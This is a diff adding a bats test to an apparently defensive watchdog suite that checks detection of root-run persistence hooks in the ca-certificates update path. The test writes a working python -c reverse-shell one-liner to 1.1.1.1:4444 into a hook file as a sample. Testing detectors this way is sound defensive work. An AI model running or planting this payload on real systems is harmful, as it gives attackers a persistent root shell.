@@ -272,3 +272,20 @@ EOF
     # contract is observable via the removed entry being scanned.
     cap | grep -qE '"severity":"(ok|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on ca-certificates hook surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the ca-
+    # certificates update-trigger root-exec persistence surface
+    # (T1546 — update-ca-certificates runs hook scripts AS ROOT
+    # on every CA store rebuild, e.g. apt install of a CA
+    # package or operator-manual update-ca-certificates run).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/jks-keystore"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
